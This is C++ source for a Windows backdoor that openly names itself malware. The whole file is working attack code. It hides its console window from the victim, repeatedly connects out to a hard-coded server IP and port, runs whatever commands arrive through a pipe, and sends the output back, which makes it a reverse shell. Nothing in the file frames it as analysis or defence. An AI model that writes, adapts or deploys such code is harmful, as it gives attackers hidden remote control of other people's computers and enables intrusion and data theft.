#include <winsock2.h>
#include <windows.h>
#include <windowsx.h>
#include <winuser.h>
#include <wininet.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <iostream>
#include <map>
#include <vector>
#include <sstream>
#include <string>

const std::string SERVER_IP = "192.168.233.135";
constexpr int SERVER_PORT = 51243;

typedef std::string (*command_handler)(const std::vector<std::string>& args);

class Socket {
private:
    int                 _socket_id;
    struct sockaddr_in  _server_address;
public:
    Socket(const std::string& server, const int& port):
        _server_address {0} {

        this->_socket_id =socket(AF_INET, SOCK_STREAM, 0);

        this->_server_address.sin_family = AF_INET;
        this->_server_address.sin_port = htons(port);
        this->_server_address.sin_addr.S_un.S_addr =
            inet_addr(server.c_str());
    }

    int Connect() {
        return connect(this->_socket_id,
                        (struct sockaddr *)&this->_server_address,
                        sizeof(this->_server_address));
    }

    int Receive(char *buffer, int length) {
        return recv(this->_socket_id, buffer, length, 0);
    }

    int Send(const char *buffer, int length) {
        return send(this->_socket_id, buffer, length, 0);
    }
    ~Socket() {
        closesocket(this->_socket_id);
    }
};

class Shell {
private:
    std::map<std::string, command_handler> _handler;

public:
    explicit Shell() {
        this->_handler["quit"] =
        [](const std::vector<std::string>& args) -> std::string {
            exit(EXIT_SUCCESS);
        };

        this->_handler["cd"] =
        [](const std::vector<std::string>& args) -> std::string {
            std::vector<std::string> path_e {args};
            std::string path {};
            path_e.erase(path_e.begin());

            for (auto arg : path_e) {
                path.append(arg);
            }

            chdir(path.c_str());

            char buffer[1024] = {0};
            getcwd(buffer, 1024);

            return std::string{buffer};
        };
    }

    ~Shell() {}

    void Run() {
        while (true) {
            /* 1. Try to connect to the server. */
            Socket sock{SERVER_IP, SERVER_PORT};
            while (true) {
                int res = sock.Connect();
                if (res == 0) {
                        break;
                }

                /* Reconnect after 10s. */
                Sleep(10000);
            }

            /* 2. Waiting for new command from server. */
            char buffer[1024] = {};
            while (sock.Receive(buffer, sizeof(buffer)) >= 0) {

                /* Parse command. */
                std::vector<std::string> command;
                std::istringstream iss{buffer};
                std::string word {0};
                char command_output[20480] = {0};

                while (std::getline(iss, word, ' ')) {
                    command.push_back(word);
                }

                if (this->_handler.find(command[0]) != this->_handler.end()) {
                    /* Run our command. */
                   std::string res = _handler[command[0]](command);
                   strncpy(command_output, res.c_str(), res.size());
                } else {
                    /* Run window command. */
                    char psBuffer[1024] = {0};
                    FILE *pPipe = _popen(buffer, "r");
                    if (pPipe) {
                        /* Reade pipe until end of file, or an error occurs. */
                        while (fgets(psBuffer, sizeof(psBuffer), pPipe)) {
                            strcat(command_output, psBuffer);
                        }

                        fclose(pPipe);

                        if (strlen(command_output) == 0) {
                            strcpy(command_output, "Invalid command");
                        }
                    } else {
                        strcpy(command_output, "Invalid command");
                    }
                }

                /* Send command output to our server. */
                sock.Send(command_output, sizeof(command_output));
            }
        }
    }
};

class MalwareController {
private:
    Shell _shell;

    MalwareController(): _shell {} {}

    ~MalwareController() {
        WSACleanup();
    }

public:
    int Init() {
        HWND        stealth;
        WSADATA     wsaData;
        /* 1. Make our backdoor window not visible to the target. */
        AllocConsole();
        stealth = FindWindowA("ConsoleWindowClass", NULL);
        ShowWindow(stealth, 0); /* Hiding the window with 0. */

        /* 2. Initialize Winsock. */
        int res = WSAStartup(MAKEWORD(2, 0), &wsaData);
        if (res != 0) {
            std::cout << "Failed to initiate use of Winsock DLL by a process."
                      << std::endl;
            return res;
        }

        return 0;
    }

    void Run() {
        this->_shell.Run();
    }

    static MalwareController* GetInstance() {
        static MalwareController controller{};
        return &controller;
    }
};

/**
 * @brief Windows program entry point function.
 * 
 * @param hInstance     - Instance Handle - OS uses this value to identify the
 *                        executable when it is loaded in memory.
 * @param hPrevInstance
 * @param pCmdLine      - Command line arguments.
 * @param nCmdShow      - Windows Flags.
 * @return int 
 */
int APIENTRY WinMain(HINSTANCE hInstance,
                        HINSTANCE hPrevInstance,
                        LPSTR pCmdLine,
                        int nCmdShow) {

    std::cout << ">> Start Malware Program <<" << std::endl;

    int res = MalwareController::GetInstance()->Init();
    if (res != 0) {
        return EXIT_FAILURE;
    }

    MalwareController::GetInstance()->Run();

    return EXIT_SUCCESS;
}